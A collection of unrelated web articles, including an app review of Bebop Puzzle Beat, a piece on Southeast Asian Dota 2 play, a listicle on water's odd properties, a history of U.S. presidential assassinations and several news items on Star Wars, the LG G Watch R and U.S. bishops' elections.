Between Hawkeye, Katniss, and the ever-popular Legolas, archery is definitely getting its moment in the spotlight! A leather bucket bag is a cute civilian take on Hawkeye's sheath of arrows, while a golden arrow bangle adds a nice dose of sheen.
What did you think?
Would you wear these looks? Did you see The Avengers? Did you love it as much as we did? (If you're planning to see it, make sure to stay through the credits!) Do you have a favorite Avenger/S.H.I.E.L.D. agent? What other geeky inspirations would you like to see? (Next time, we'll be heading to a very special beach…and flying Oceanic Airlines to get there, of course!) As always, let me know in the comments!

Bebop Puzzle Beat (Free) by Plastic Dreams is a new new take on your typical matching puzzle game. If you like the match-three genre but want something fresh and exciting, then Bebop Puzzle Beat is just what you need. This is especially true if you're a fan of jazz music, as the entire game revolves around it. Even though I've gone through hundreds of games on the App Store, my favorite genre is still the classic matching puzzle game. As tiring as the formula may be, I can't help but love them, since the entire experience puts me in a zen-like state and I love racking up big combos, seeing if I can set a new personal record. However, I do get tired of seeing the same Candy Crush Saga-style games over and over in the App Store, so when I heard of Bebop Puzzle Beat, I was intrigued — a matching puzzle music game? It's definitely a mashup that you don't see everyday, at least.
The graphics in Bebop Puzzle Beat are beautiful and stylish. It has cartoonish visuals that are rather charming, and you'll be impressed with the various characters that you'll come across as you play. The typography is old-school and gives it a nice, retro feel. Colors in Bebop Puzzle Beat are bright, vibrant, and all contrast with each other, so it is easy to tell each piece apart. The only problem I noticed is the fact that while most of the game is sharp and crisp on Retina displays, I did see some popups or screens that appear a bit fuzzier than they should be — it feels a bit out of place with the optimized visuals, so hopefully the developer fixes this in the future. Otherwise, animations are smooth and the music is upbeat and catchy, just as you'd expect from a jazz-themed game. Like other puzzle games, players will have to progress through each level one-by-one. There are six different worlds to explore, with each of them being inspired by the 1940s era, with a total of 120 stages. In Bebop Puzzle Beat, players must join Bosco, Miles, Hot, and Jelly on a journey to save Mila, a lovely singer, from evil. While the main goal in each level is to make matches, each one will have a different objective that you must meet before you're able to progress. These range from simple things like “Get 500 points in 60 seconds” to harder ones like “Destroy 10 green tiles in 90 seconds.” Eventually, you'll reach challenging boss battles as well, so the variety of goals in the game helps keep interest high throughout. You can also earn up to three musical notes on each stage depending on your performance, and a bar at the bottom indicates your progress threshold. Since Bebop Puzzle Beat is a free game, it does use an energy system, but it is cleverly disguised. Since you start the game with four characters that travel together, one is trapped if you lose a game. If all four are trapped, then you have to wait a bit before they are freed. However, there is a Master Key available through in-app purchase that lets you free them anytime, so you never have to wait. I would also assume that this will remove ads from the game as well, as they pop up every now and then between levels.
Controls are simple enough, though I do feel that they could be more optimized and responsive. Basically, tap on the colored piece that you want to start a chain with, and then tap on other like-colored pieces to create a chain (they don't have to be adjacent to each other). You only have a few seconds to complete each match, and if you tap on a piece that is farther away, it connects with any like-colored pieces that are in-between those two points, thus creating a combo. As time passes, the board will fill up with new pieces, so if you only have a few gems but want to rack up more points, just wait a few seconds to see what colors pop up and make large clusters. There are even “joker” pieces that act as wild cards, so they can match with any color on the board. Later on, though, things will spin out of control if you aren't careful. While the tap-to-select gesture works, I found that it can feel a bit unresponsive at times. Due to the fast nature of the game, I find myself tapping around furiously, but sometimes it does not register a tap so the piece I wanted to select is not selected and it's too late for that large chain I wanted to make. Hopefully the developer can fix the responsiveness in a future update, but the game is still playable in its current iteration. At the moment, the game lacks a point system, so there is no Game Center integration for leaderboards or achievements. I hope that the developer can change this in the future though, as I think it would be a good addition and add to the replay value. Still, I'm enjoying the game a lot since I downloaded it last night, as it is a unique approach to the tried-and-true matching puzzle game formula. Plus, the visuals are great and the music is delightful. I just want to see crisper visual elements (some appear fuzzy compared to the rest) and more responsive controls. I highly recommend checking out Bebop Puzzle Beat if you like jazz and puzzle games. Bebop Puzzle Beat is on the App Store as a universal download for your iPhone and iPad with optional in-app purchases.

Godz on SEA Dota: “Not just about being aggressive”
John Paolo "Sandata" Bago
For years, discussion about what defines SEA Dota 2's approach to the game has always been met with a nebulous answer: “It's aggressive.”
The descriptor, stemming all the way back to the beginnings of competitive Dota 1 with Kingsurf Malaysia's Yamateh, has become a somewhat lazy way to explain how teams from the region think about and conceptualize their strategies. It becomes especially problematic once you realize that aggression isn't a unique factor at all.
Newbee's Hao, for example, is also a very aggressive carry player hailing from China. For Newbee, it isn't uncommon for the games to average a kill a minute on their way to closing out opponents in LANs. Hao, probably the best carry player out of China right now, has made a career on his aggressive approach, often doing everything in his power to win a game — even if it means forcing engagements early and often.
Similarly, the European regions have been showing so much aggression as of late. Team Empire's new line-up has four players regularly averaging high-kill scores, even on supports. While it isn't uncommon for carry player RAMZES666 to lead his team in kills, Miposhka's aggressive rotations has him assassinating enemy laners starting with rotations from minute three onwards.
But with the region producing two world-class teams — the most in recent years — in Fnatic and MVP, maybe it's time to reassess and talk about a more nuanced way of looking how SEA Dota 2 is truly played. For long time scene analyst and caster Godz, SEA Dota 2 is about the individual and early game dominance.
“I think the aggressive descriptor of SEA dota is much more about about individual plays,” said Godz. “There's a lot talented individual SEA players who look to get ahead early in the laning stage so it comes off as a aggressive play. It's not just about being aggressive though.”
“SEA Dota as a whole is very early-game focused; (teams) want to win the laning phase,” Godz said. “They don't tend to watch the big picture, which isn't necessarily a bad thing. In their minds, if they win the all the lane, they can win the whole game. You don't have to look at how you're line-up is going to match against the other team's in the late game.”
“The way they see it, it doesn't matter if you're line-up scales late game or not if you have a 20,000 gold advantage. It's a very different way of looking at Dota right now, especially with all of the changes the game has gone through,” he added.
An important contrast indeed. Since The International 4, the game of Dota 2 has implemented changes to ensure that games aren't decided by who gets ahead first in match. The “rubber-band” mechanics of the last few patches have forced teams from around the world to look towards “safer” styles. Most notably, Evil Geniuses in the post-TI 4 to their eventual win at The International 5 have been spearheading a more macro-focused style of Dota 2 play. One that is focused on minimizing economic losses from losing engagements through passive play until they can farm key item spikes and distributing the farm priority among heroes.
Since then, other teams have picked up on the EG game plan and introduced twists of their own. Both OG and Newbee, for example, balance macro and farming with well-timed rotations instead of EG's more passive playstyle.
SEA Dota, on the other hand, seems to be playing Dota from an older time. But that trend might be changing with the successes of SEA region teams in the global stage.
“This season, I do think SEA's approach is a little bit more balanced now with teams picking some more scaling heroes for the late game,” described Godz. “If anything, the stereotype of SEA as aggressive Dota is somewhat being broken by the top teams.”
“Mineski certainly has more of an eye towards the late game. We saw them go up against First Departure and win in 45 minutes after trailing in the first 20 minutes,” added Godz. “I do think that people tend to call Mineski aggressive because they tend to overextend but to me, they aren't a team that prioritizes winning fast. They're not just aggressive anymore; they can balance it out when the game calls for it.”
Overall, Godz believes that Dota 2 in SEA has come a long way in terms of experience that its character can no longer be described solely by aggression. “A lot has improved in terms of skil level of the teams and it's really because teams like Fnatic and MVP are on a world-level,” continued Godz. “Even Mineski succeeding and impressing at the Frankfurt Major are turning heads. The last time the SEA region did really well was around TI to TI3 and it felt like the region as a whole took a break for a year or two, so It's great to see it on the rise again.”
“For the Major, it wouldn't surprise me if a team like MVP or Fnatic upset a traditionally late-game centered team with their own late-game team play. You have a player like Dj and Ohaiyo, for example, who can pick up late game scaling heroes that really contribute in the later stages from the game. And then of course you have Mushi who can pull out a hero like Medusa at a moment's notice,” said Godz. “You can expect a lot of teamfights from them, and a lot of individual flashy play, but in the end Fnatic and MVP have the discipline now to think of the game as a whole.”
Perhaps an accurate description of SEA Dota lies in the earlier-than-usual rotation of teams like Fnatic and MVP. Perhaps it lies in the late-game focus of Mineski in the era of Bimbo on carry and Cast in shotcalling. Perhaps its in the aggressive, play-from-behind, hail-maries of QO. Perhaps it lies in the 65-minutes of passivity from carries like Meracle or Lakelz that culiminates in an explosive team fight right as the game is about the end.
But whatever SEA Dota, what is true is that relegating it to a simplistic answer is not enough to describe a region that is still evolving its own identity. It's a cop-out. As teams experience more success and tectonic shifts in team compositions change for SEA, the best franchises in the region will lead the way with every victory in the global stage.
But the individual plays that have made careers in SEA will never go away. Perhaps what SEA dota is truly about is the players and their individual shining moments. In a region without clear infrastructure support for teams, the highlight reels of QO, MidOne and Mushi serves as a beacon to inspire would-be pros to take the leap and hone their skills to make it in the pro scene.
Water, good ol' H 2 O, seems like a pretty simple substance to you and me. But in reality, water - the foundation of life and most common of liquid - is really weird and scientists actually don't completely understand how water works.
Here are 5 really weird things about water:
1. Hot Water Freezes Faster Than Cold Water
Take two pails of water; fill one with hot water and the other one with cold water, and put them in the freezer. The hot one would be frozen before the cold one. But wait, you say, that's counterintuitive: wouldn't the hot water have to cool down to the temperature of the cold water before proceeding to freezing temperature, whereas the cold one has "less to go" before freezing?
In 1963, a Tanzanian high-school student named Erasto B. Mpemba was freezing hot ice cream mix in a cooking class when he noticed that a hot mix actually froze faster than a cold mix. When he asked his teacher about this phenomenon, his teacher ridiculed him by saying "All I can say is that is Mpemba's physics and not universal physics."
Thankfully, Mpemba didn't back down - he convinced a physics professor to conduct an experiment which eventually confirmed his observations: in certain conditions, hot water indeed freezes before cold water*.
Actually, Mpemba was in good company. The phenomenon of hot water freezing first, now called the "Mpemba effect" was noted by none other than Aristotle, Francis Bacon and René Descartes.
But how do scientists explain this strange phenomenon? It turns out that no one really knows but there are several possible explanations, including differences in supercooling (see below), evaporation, frost formation, convection, and effects of dissolved gasses between the hot and cold water.
*In reality - of course - it's much more complex than that: hot water freezes first (it forms ice at a higher temperature than cold water), whereas cold water freezes faster (it takes less time to reach the supercooled state from which it forms ice) - see discussion on our previous blog post about this topic.
2. Supercooling and "Instant" Ice
Everybody knows that when you cool water to 0 °C (32 °F) it forms ice ... except that in some cases it doesn't! You can actually chill very pure water past its freezing point (at standard pressure, no cheating!) without it ever becoming solid.
Scientist knows a lot about supercooling: it turns out that ice crystals need nucleation points to start forming. These nucleation points could be anything from gas bubbles to impurities to the rough surface of the container. Without these things, water would continue to be a "supercooled" liquid well below its freezing point.
When nucleation is triggered, then a supercooled water would "instantly" turn into ice, as this very cool video clip by Phil Medina of MrSciGuy shows:
Note: Similarly, superheated water remains liquid even when heated past its boiling point.
3. Glassy Water
Quick: how many phases of water are there? If you answer three (liquid, gas, and solid) you'd be wrong. There are at least 5 different phases of liquid water and 14 different phases (that scientists have found so far) of ice.
Remember the supercooling we talked about before? Well, it turns out that no matter what you do, at -38 °C even the purest supercooled water spontaneously turns into ice (with a little audible "bang" no less). But what happens if you continue to lower the temperature? Well, at -120 °C something strange starts to happen: the water becomes ultraviscous, or thick like molasses. And below -135 °C, it becomes "glassy water," a solid with no crystal structure. (Source)
4. Quantum Properties of Water
At a molecular level, water is even weirder. In 1995, a neutron scattering experiment got a weird result: physicists found that when neutrons were aimed at water molecules, they "saw" 25% fewer hydrogen protons than expected.
Long story short, at the level of attoseconds (10-18 seconds) there is a weird quantum effect going on and the chemical formula for water isn't H 2 O. It's actually H 1.5 O! (Source)
5. Does Water Have Memory?
In the alternative medicine of homeopathy, a dilute solution of a compound can is purported to have healing effects, even if the dilution factor is so large that statistically there isn't a single molecule of anything in it except for water. Homeopathy proponents explain this paradox with a concept called "water memory" where water molecules "remember" what particles were once dissolved in it.
This made no sense to Madeleine Ennis, a pharmacologist and professor at Queen's University in Belfast, Northern Ireland. Ennis, who also happened to be a vocal critic of homeopathy, devised an experiment to disprove "water memory" once and for all - but discovered that her result was the exact opposite!
In her most recent paper, Ennis describes how her team looked at the effects of ultra-dilute solutions of histamine on human white blood cells involved in inflammation. These "basophils" release histamine when the cells are under attack. Once released, the histamine stops them releasing any more. The study, replicated in four different labs, found that homeopathic solutions - so dilute that they probably didn't contain a single histamine molecule - worked just like histamine. Ennis might not be happy with the homeopaths' claims, but she admits that an effect cannot be ruled out. So how could it happen? Homeopaths prepare their remedies by dissolving things like charcoal, deadly nightshade or spider venom in ethanol, and then diluting this "mother tincture" in water again and again. No matter what the level of dilution, homeopaths claim, the original remedy leaves some kind of imprint on the water molecules. Thus, however dilute the solution becomes, it is still imbued with the properties of the remedy. You can understand why Ennis remains skeptical. And it remains true that no homeopathic remedy has ever been shown to work in a large randomised placebo-controlled clinical trial. But the Belfast study (Inflammation Research, vol 53, p 181) suggests that something is going on. "We are," Ennis says in her paper, "unable to explain our findings and are reporting them to encourage others to investigate this phenomenon." If the results turn out to be real, she says, the implications are profound: we may have to rewrite physics and chemistry. (Source)
So far, other scientists failed to reproduce Ennis' experimental findings (throughout, Ennis herself was skeptical of the result's interpretation that water has a "memory" but maintained that the phenomenon she saw was real).

More recently, a team of scientists at the University of Toronto, Canada, and Max Born Institute in Germany, studying water dynamics using fancy multi-dimensional nonlinear infrared spectroscopy did find that water has a memory of sorts - in form of hydrogen bond network amongst water molecules. Problem for homeopathy was, this effect lasted only 50 femtoseconds (5 x 10-14 seconds)!
Bonus: Ice Spikes
photo: SnowCrystals
Ice spikes are, well, spikes that grow out of ice cube trays. They look like stalagmites found in caves, and you can make 'em yourself using distilled water. Kenneth G. Libbrecht of SnowCrystals explains:
How do Ice Spikes Form? Ice spikes grow as the water in an ice cube tray turns to ice. The water first freezes on the top surface, around the edges of what will become the ice cube. The ice slowly freezes in from the edges, until just a small hole is left unfrozen in the surface. At the same time, while the surface is freezing, more ice starts to form around the sides of the cube. Since ice expands as it freezes, the ice freezing below the surface starts to push water up through the hole in the surface ice (see diagram). If the conditions are just right, then water will be forced out of the hole in the ice and it will freeze into an ice spike, a bit like lava pouring out of a hole in the ground to makes a volcano. But water does not flow down the sides of a thin spike, so in that way it is different from a volcano. Rather, the water freezes around the rim of the tube, and thus adds to its length. The spike can continue growing taller until all the water freezes, cutting off the supply, or until the tube freezes shut. The tallest spike we've seen growing in an ordinary ice cube tray was 56mm (2.2in) long. (Source)
Bonus 2: Make Instant Snow with Boiling Water
What do you get when you throw boiling water to the air in subzero weather? Instant snow. Interestingly, it only works with boiling hot water:
[YouTube clip]
These aren't the only things weird about water. We didn't talk about how water density changes with temperature (ice, for instance, is less dense than water so it floats - a key property of water that made life possible in the oceans and lakes). Nor did we talk about the weirdly strong surface tension of water, ordered clustering of liquid water, and so on.

EAST LANSING, Mich. – A Hispanic Michigan State University professor faces attacks from students for supporting Republican presidential candidate Donald Trump and appearing at an August rally.
Republican Hispanic professor Dr. Joseph Guzman is the subject of student outrage at MSU for his support of Trump, specifically for serving on his National Hispanic Advisory Committee and as co-chair of his Michigan campaign, the blog West Michigan Politics reports.
Guzman sat behind the presidential hopeful during a rally in Lansing last month and he was captured on video at the event, which prompted some students to produce a flyer attacking his role in Trump's campaign as well as his teaching practices.
“Meet Your Professor!” the flyer reads above a picture of Guzman at the Trump rally, his face circled in red.
The picture's caption said “Professor Guzman cheers on fascist oligarch while waving a Make America Great Again sign.”
“Professor Guzman is a member of the National Hispanic Advisory Council for the Trump Campaign. Guzman claims to represent the Hispanic community by advocating for unfair, and unequal working conditions for migrant workers that place them at the mercy of predatory bosses,” the flyer states.
The poster also included “student testimony” that alleges Guzman is a bad teacher who uses guest speakers that “don't correlate with the class material” and who has “constantly tried to recruit people to join the humanities program.”
Guzman, a professor of Chicano and Latino studies, told the news site he's also faced attacks from students and others over social media, in the halls of the university and while out with his family.
Regardless, he's not wavering in his support of Trump, whom he met with in person last month, and he's using the opposition as an opportunity to school students on civics.
“The First Amendment protects freedom of expression and association, particularly in the civic realm,” Guzman told West Michigan Politics. “It's unfortunate that some think civic activity involves suppressing other individuals right to free speech with lies, smears and disruption.”
Guzman told City Pulse he doesn't hide the fact that he's a longtime Republican or that he supports Donald Trump, who aligns with the professor's political views in many ways. Guzman said Trump's economic policies, support for school choice, and opposition to abortion are some of the reasons he supports the GOP candidate, among others.
“I can't go through all the gamut of issues, but I will say broadly Mr. Trump appeals to working people,” Guzman said.
“Mr. Trump is really intent on fixing things that are broken in our system, and we got a lot them,” he continued. “He has demonstrated he will show restraint, he will think about the larger interests and he won't be influenced by vested interests. I think that's very powerful.”
Guzman also defended Trump's call for a tighter border with Mexico because the current situation leaves illegal immigrants vulnerable to coyotes who transport them into the country.
“Mr. Trump's plan to strengthen our border and stop illegal immigration is tough and fair for all,” he told WMP.
“It will enhance security, address unlawful trafficking and keep Americans safe,” Guzman said. “Untold suffering is caused by human and drug trafficking stemming from our uncontrolled border, and it must be stopped.
“Mr. Trump's plan to immediately secure our borders, end sanctuary cities, protect us from violent offenders and enforce current immigration laws is the opposite of Hillary Clinton's dishonest 100-day amnesty plan and the Democrats' other hollow, unfulfilled promises to Latinos,” he continued. “Voters have a clear choice in this election: address our border problems in a lasting way that is tough and fair for all, or continue with empty promises that compound human suffering and compromise our safety and security.”
At least one of Guzman's colleagues is standing with him amid the criticisms, even if he doesn't agree with the professor's perspective.
Ruben Martinez, director of the Julian Samora Research Institute at MSU, told the City Pulse he has no issue with Guzman supporting Trump when the majority of Latinos do not.
“He's a private citizen,” Martinez said.
There have been four assassinations of U.S. Presidents to date. Two are very famous and two not as well-known.
The first assassination of a President is both well-known and well-documented. On April 14, 1865, actor and southern advocate John Wilkes Booth shot the 16th U.S. President Abraham Lincoln at Ford's theater. Lincoln died from his wounds the next day. (Incidentally, shortly before this, John Wilkes Booth's brother saved Abraham Lincoln's son's life.)
Less well-known was the next assassination of a commander-in-chief. On July 2, 1881, 20th U.S. President James Garfield was assassinated by Charles J. Guiteau. He did live for 80 days after being shot, but developed a severe infection from the gunshots, with a contributing factor possibly being several doctors who stuck their unsterilized fingers in one of the bullet holes to try to find the bullet lodged deep in Garfield's body. (Note: contrary to popular belief, much of the time, it's better to leave the bullet in than try to remove it, even today- back then even more so.) His health gradually deteriorated until he finally suffered a heart attack and an aneurysm.
Garfield was nearly assassinated earlier, but Guiteau lost his nerve after seeing the President's grief over his extremely ill wife. After Garfield's wife recovered somewhat, Guiteau followed through with his plan and shot the President.
The next assassination of a U.S. President is also slightly less well-known. 25th President William McKinley was shot by anarchist Leon Czolgosz on September 6, 1901. McKinley died from an infection caused by the bullet wounds a week later, on September 14, 1901.
After McKinley had been shot twice, his immediate action was to save the life of the assassin who a mob had gathered around. He then asked for them to break the news gently to his wife. The two were extremely close and were almost never parted (particularly as she was epileptic and he liked to be around in case she had a seizure). On the way to his funeral, his wife was “huddled in a compartment of the funeral train, praying that the Lord would take her with her Dearest Love.” After the funeral, she set up a shrine in their home and regularly visited McKinley's burial vault. It was thought she wouldn't last long after his death, but lived another 6 years before dying at 59.
On November 22, 1963, 35th president John F. Kennedy was shot in Dallas by Lee Harvey Oswald, perhaps a part of a conspiracy, perhaps not. He died shortly thereafter.
Although Lincoln's assassination was the first, it was not the first Presidential assassination attempt.
On January 30, 1835, Andrew Jackson, the 7th and perhaps the most colorful of all Presidents (such as when he killed a man who publicly called Jackson a “worthless scoundrel, a poltroon and a coward”), was attending a funeral when his life was almost ended.
The would-be assassin was Richard Lawrence, a painter, who at the time of the assassination attempt believed himself to be King Richard III of England (in fact, Richard III, the last King of the House of York, died some 350 years before at the Battle of Bosworth Field, which is regarded by many historians as marking the end of the Middle Ages; this battle also is considered by many to have brought to a close the Wars of the Roses).
In any event, around the time of the assassination attempt, Lawrence found himself out of work, something he blamed President Jackson for, rather than his own insanity. He further thought that the U.S. government owed him a significant amount of money and if he could just kill Jackson, then it would be paid to him. He also felt that money would become plentiful in the U.S. as a result of Jackson's death. Once he had his money, he planned to return to England where he would take back his throne, as King Richard III.
The actual assassination attempt took place after a funeral that Jackson attended, that of Warren R. Davis, a former Representative from South Carolina. When Jackson was leaving the funeral, Lawrence stepped out from behind a pillar he was hiding behind, pointed his Derringer at Jackson from around 13 feet away and pulled the trigger. Reports state the firearm went off, but the bullet did not leave the chamber. He then quickly discarded the first Derringer and drew out his second and pulled the trigger, this time with Jackson just a few feet away (rather than run away, or try to hide, which would have been contrary to Jackson's nature, he charged his would be assassin). This second shot reportedly went off like the first, with a loud bang, but with no bullet exiting the chamber.
Jackson didn't take kindly to this assassination attempt and subsequently attacked Lawrence with a cane. Others around Jackson helped subdue Lawrence, including Congressman Davey Crocket, who incidentally was a staunch political enemy of Jackson, but nevertheless saw fit to help him take down Lawrence. Some reports even state that Jackson had to ultimately be pulled away from Lawrence as he continued to beat him even when Lawrence was down and completely subdued.
Lawrence was subsequently tried, though not convicted, by virtue of his insanity. He was then placed in a variety of asylums for the remainder of his life, dying 26 years later in 1861.
Conspiracy theorists at the time felt that Lawrence's assassination attempt was actually not Lawrence's idea, but was instigated by certain of Jackson's political opponents, including Senator George Poindexter, who had hired Lawrence to paint his home just a few months before the attempt on Jackson's life. Indeed, enough people thought Poindexter was involved in the assassination attempt that many of his own supporters withdrew their support and he was unable to get re-elected. Jackson himself thought Senator John C. Calhoun was the main person behind the attempt.

CEO of The Walt Disney Company Bob Iger attends the Allen & Co Media Conference in Sun Valley, Idaho July 13, 2012. REUTERS/Jim Urquhart
PORTLAND, Oregon (Reuters) - The highly anticipated next installment of the “Star Wars” franchise will be set 30 years after “Episode VI: Return of the Jedi,” Walt Disney Co.'s chief executive officer Bob Iger said on Tuesday at the company's annual shareholders meeting.
Disney purchased “Star Wars” production company LucasFilm for $4.05 billion in 2012 and announced it would release three new films in the popular sci-fi series. Fans have been avidly awaiting details of the next film, “Star Wars: Episode VII.”
“Return of the Jedi” was the third film in the first trilogy of “Star Wars” released between 1977 and 1983. The series is set in a galaxy far, far away, in the past.
Iger did not reveal any casting news, other than to confirm the return of the robot character R2D2. The official Star Wars website posted on Monday the new films would feature “a trio of new young leads along with some very familiar faces,” and that filming would begin in May at London's famed Pinewood studios.
Rumors have swirled for over a year on whether some of the franchise's stars, including Harrison Ford and Carrie Fisher, would return. Trade magazines have reported that rising stars including Oscar-winner Lupita Nyong'o and “Girls” actor Adam Driver were being considered.
The “Star Wars” franchise was created by director George Lucas and comprises six films that have grossed more than $4.4 billion at the worldwide box office since the first film was released in 1977.
“Episode VII” will be released on December 18, 2015, and will be directed by J.J. Abrams, who helmed the recent “Star Trek” film franchise reboot.

When Google first announced Android Wear earlier this year buyers were instantly excited about the Moto 360 for its round design, but another round watch is coming extremely soon. Currently the LG G Watch, Gear Live, and Moto 360 are available, but LG's new round watch called the LG G Watch R is up next.
Back in August LG announced a brand-new smartwatch running Google's Android Wear operating system aimed at buyers waiting for the Moto 360. It's called the LG G Watch R (for Round) and it's already gaining popularity for being a simple watch design first, a piece of jewelry, and smartwatch second.
Read: Moto 360 Battery Life Improved with new Update
While the initial announcement didn't share pricing or a release date, thanks to a slip in the official LG German Press Release we knew it was coming in Q4, but today AT&T has confirmed everything potential buyers have been waiting for. The new LG G Watch R will be available in the US from AT&T starting later this week.
The Moto 360 is the most popular smartwatch at the moment. Offering a stunning round face and simple design, the company has had a hard time keeping enough inventory in stock for eager buyers. If you are still on the fence, waiting for the Apple Watch, or want the new LG G Watch R, we have good news.
Today AT&T and LG announced the new LG G Watch R will be in AT&T stores and available online starting November 5th. That's in two days. To be accurate, it will be available online starting on November 5th, and in stores nationwide starting on the 7th, priced at $299. Previously we heard reports of a Q4 release date and a few prices were being mentioned, but this is the first confirmation for US buyers.
Read: Moto 360 vs Apple Watch: 6 Key Differences
We knew it was coming sometime in Q4, but now we have an actual release date and pricing for those in the United States. AT&T is the first carrier to get their hands on the new watch, and surely it will be bundled with a few smartphone deals.
The LG G Watch R features a fully round 1.3-inch OLED display, a large 410 mAh battery, 4GB of internal storage, is dust and water resistant IP67 certified, and is built with durable metal and a nice leather strap. It's a premium watch, one that also happens to run the latest Android Wear 4.4 software update released late last month.
The LG G Watch R has been available for a short time outside of the US, and so far initial impressions have been rather favorable. If it's worth the $50 price increase over the $249 Moto 360, we're not sure, but buyers will be able to decide themselves in AT&T stores later this week.
Again, the LG G Watch R is hitting the United States on November 5th, and in AT&T stores November 7th starting at $299. Making it the most expensive Android Wear device yet. Are you getting one?
BALTIMORE – In a surprise result, Archbishop Joseph Naumann of Kansas City beat Cardinal Blase Cupich of Chicago as head of the U.S. bishops' committee on pro-life activities by a vote of 96-82 during the Tuesday morning elections of the USCCB fall assembly.
The results will likely be viewed by many that the “Francis effect” has yet to take hold fully of the U.S. Conference of Catholic Bishops and a rejection of the “consistent ethic of life” methodology, promoted by the late Cardinal Joseph Bernardin, who served as Archbishop of Chicago in the 1980s and '90s.
Cupich, considered a protege of Francis and the current head of the Chicago archdiocese, is the current standard-bearer of the view, which combines pro-life activism on abortion with other issues such as access to health care and poverty reduction measures.
This is the first time in nearly 40 years the U.S. bishops have chosen not to elect a cardinal as head of the pro-life committee.
This closely watched election has been viewed by many as a referendum on both the conference's approach to pro-life issues and how it aligns with Francis. Naumann will replace outgoing head of the committee, Cardinal Timothy Dolan of New York. During his report on the pro-life committee on Monday, Dolan praised Nuamann's work on the committee and as a board member of Human Life Action.
Naumann's approach to life issues has long been marked by a specific focus on abortion.
In May of this year, Naumann made headlines when he announced that the parishes in his diocese would no longer host the Girl Scouts because of their affiliation with Planned Parenthood.
In an interview with Crux at the time, he said “the issues that pertain to family life, to marriage, to the dignity and sanctity of human life, do have a priority in our Catholic social teaching. Those are kind of foundational issues for us… I would say, however, in terms of the magnitude of things, abortion is a much more important issue, simply because of the sheer number of innocent lives that are taken every year in our culture.”
During the 2016 presidential election, Naumann took to the pages of his archdiocesan newspaper, The Leaven, to call out then-vice presidential candidate Senator Tim Kaine, a Catholic, for being personally opposed to abortion, yet failing to maintain those convictions in the political realm.
“If he knows these truths of biology, why would he believe that anyone has the right to authorize the killing of an unborn human being? This is where the reproductive choice euphemism breaks apart,” Naumann wrote. “Does anyone really have the choice to end another human being's life? Our choices end where another individual's more fundamental rights begin.”
Naumann has been archbishop of Kansas City, Kansas since 2005.
Also elected was Archbishop Allen Vigneron of Detroit as conference secretary-elect for the conference. Archbishop Joseph Kurtz of Louisville, Kentucky, was elected as head of the committee on religious liberty; Bishop Michael Burbidge of Arlington, Virginia, as head of the committee on communications; Bishop Nelson Pérez of Cleveland as head of the committee Cultural Diversity in the Church; Bishop Kevin Rhoades of Fort Wayne-South Bend as head of the committee on doctrine; and Bishop Joseph Cistone of Diocese of Saginaw as head of the committee for national collections.
The U.S. bishops will continue in open session on Tuesday afternoon with discussion and a vote on the cause for canonization for Nicholas William Black Elk, a former Sioux medicine man turned Catholic teacher and reports and updates from the committees on Domestic Justice and Human Development and Cultural Diversity in the Church. On Wednesday, the assembly will conclude with a final day of executive session.
Stay tuned for Crux's latest news and updates from the USCCB fall assembly, where Crux's national correspondent Christopher White will be providing regular updates. Follow him on Twitter @CWWhite212 and visit Crux for daily updates and interviews from Baltimore.
Scientists found that after a bout of fighting – chasing and pecking each other – the birds would then stop and switch to offering tender loving care.
This behaviour which involved touching beaks and preening was especially striking as the birds are not known for their affectionate ways.
Monitoring a group of seven captive ravens (Corvus corax), Dr Orlaith Fraser of the University of Vienna and colleague Thomas Bugnyar found that pairs of birds were likely to be more friendly to each other if they had fought each other in the previous 10 minutes.
"It wasn't just standard friendly behaviour," Dr Fraser told the New Scientist.
"Rather the ravens sat touching each other, and sometimes touched their beaks together or preened each other.
"Ravens are not tactile like primates, so sitting in contact is a strong social signal."
Plenty of primates and other mammals reconcile after a conflict, but previously no birds were known to do so, she claimed.
Comparing animals' typical behaviour with the behaviour they display in the minutes immediately after a fight is a "well-established method" to look for such behaviour, said Filippo Aureli of Liverpool John Moores University in the UK.
"That's very good evidence for reconciliation," he said.
"Many animals have mechanisms for maintaining valuable relationships," said Phyllis Lee of the University of Stirling, UK.
Social animals that can recognise other individuals and form long-term relationships with them are most likely to be able to reconcile, she says.
The researchers had previously shown that ravens sometimes console group members who have lost a fight.
The original research was published in the journal Plos One.

Game Of Thrones TWOW Spoilers Spotted in Library
George R.R. Martin, the author of 'A Song of Ice and Fire', tends to keep secrets on the stories and characters very close at hand, away from prying eyes.
However, The Cushing Library is currently holding the 1600-page manuscript for 'A Dance With Dragons'; the latest book from the series, and is allowing anyone to check out the work. One Redditor took the time to delve into the manuscript, trying to find plot spoilers and anything else.

Most of the pages are full of small proofreading and editing marks, some declaring Martin's obsession with the phrases "words are wind", "soon or late" (instead of sooner or later) to be problematic, even though Martin writes it off using the STET mark.
The editor also takes issue at the start of Jaime Lannister's chapter, claiming due to it being five years since the reader has followed Jaime, perhaps they should be re-told about his situation.
One of the big spoilers for readers is a part on Coldhands, the ominous guard of Bran Stark and Samwell Tarly, who works with The Children beyond the Wall.
To many Game of Thrones fans, Coldhands is Benjen Stark, Jon Snow's uncle and Brother on the Night's Watch, who disappeared early on in the story. The bodies of Benjen and his party were never found, leading people to believe the figure Coldhands might be all that remains of Benjen Stark.
In the manuscript however, Martin firmly declares Coldhands is not Benjen Stark, replying to an editorial mark saying "Is this Benjen? I think its Benjen..." with a simple "NO", shutting down most who believe Coldhands has some resemblance.
This would explain why Coldhands is not featured on HBO's Game of Thrones in Season 5, if Martin intends to keep the identity of Coldhands a secret. HBO is also moving away from zombies, like Coldhands and Lady Stoneheart.
It is unclear if Coldhands will make a reappearance in 'The Winds of Winter', considering Bran Stark is now with The Children of the Forest and Samwell Tarly is far away from the North, there is little need of the helper.
Martin has not offered regular updates on 'The Winds of Winter', due to the expansive amount of work he has put into the sixth book, potentially the second last of the Song of Ice and Fire series. According to analysts, TWOW will come between 2015 and 2017, citing Martin's previous writing speed.
There is a worry among HBO and Martin himself that the TV show will catch up to the books, meaning Martin will have to give information on future stories and development, before the full book is finished.

Donald Trump kicked off his victory tour in Indiana after fulfilling a promise made on the campaign trail. Nearly two years ago, Carrier announced they were closing a plant down and moving the production line to Mexico. Earlier this week, Carrier announced they would keep the plant open instead, saving more than 1,000 jobs.
According to a Wall Street Journal report, United Technologies, which owns Carrier, will receive a $7 million tax break over the next 10 years.
“The state of Indiana has offered Carrier a $7 million package over multiple years, contingent upon factors including employment, job retention and capital investment,” Carrier said in a statement moments before Trump arrived in Indiana.
